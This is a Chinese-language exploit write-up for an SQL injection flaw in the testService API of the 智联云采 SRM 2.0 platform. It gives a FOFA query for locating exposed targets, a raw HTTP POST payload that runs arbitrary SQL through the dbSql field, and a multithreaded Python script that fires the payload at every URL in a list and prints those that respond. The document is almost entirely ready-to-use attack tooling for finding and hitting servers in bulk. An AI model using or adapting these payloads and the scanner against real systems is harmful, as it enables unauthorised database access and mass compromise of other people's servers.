# 智联云采testService存在SQL注入漏洞

fofa:

```
title=="SRM 2.0"
```

poc:

```
POST /adpweb/a/ica/api/testService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X-Requested-With: XMLHttpRequest
Content-Type: application/json

{
    "dbId": "1001",
    "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
    "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
    "serviceCode": "q",
    "serviceName": "q",
    "serviceParams": "{\"lang\":\"zh_CN\"}"
}
```

批量检测脚本:

```
import requests
import threading
import queue
from urllib.parse import urlparse, urlunparse

# 配置请求头和请求数据
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
}

data = {
    "dbId": "1001",
    "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
    "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
    "serviceCode": "q",
    "serviceName": "q",
    "serviceParams": "{\"lang\":\"zh_CN\"}"
}

# 线程数
NUM_THREADS = 10

# 结果队列
result_queue = queue.Queue()

# 检查 URL 是否包含协议头
def ensure_protocol(url):
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        return urlunparse(('http', parsed_url.netloc, parsed_url.path, parsed_url.params, parsed_url.query, parsed_url.fragment))
    return url

# 发送 POST 请求并检查响应
def test_url(url):
    try:
        full_url = f"{ensure_protocol(url)}/adpweb/a/ica/api/testService"
        response = requests.post(full_url, headers=headers, json=data, timeout=5)
        if response.status_code == 200:
            result_queue.put(full_url)
    except requests.RequestException as e:
        pass

# 线程函数
def worker():
    while True:
        url = url_queue.get()
        if url is None:
            break
        test_url(url)
        url_queue.task_done()

# 主函数
def main():
    global url_queue
    url_queue = queue.Queue()

    # 读取 URL 列表
    with open('url.txt', 'r') as file:
        urls = file.readlines()

    # 启动线程
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    # 将 URL 放入队列
    for url in urls:
        url_queue.put(url.strip())

    # 等待所有任务完成
    url_queue.join()

    # 停止线程
    for _ in range(NUM_THREADS):
        url_queue.put(None)
    for t in threads:
        t.join()

    # 输出有漏洞的 URL
    while not result_queue.empty():
        print(result_queue.get())

if __name__ == "__main__":
    main()
```

使用方法:

```
python poc.py
同目录下保存一个url.txt
```

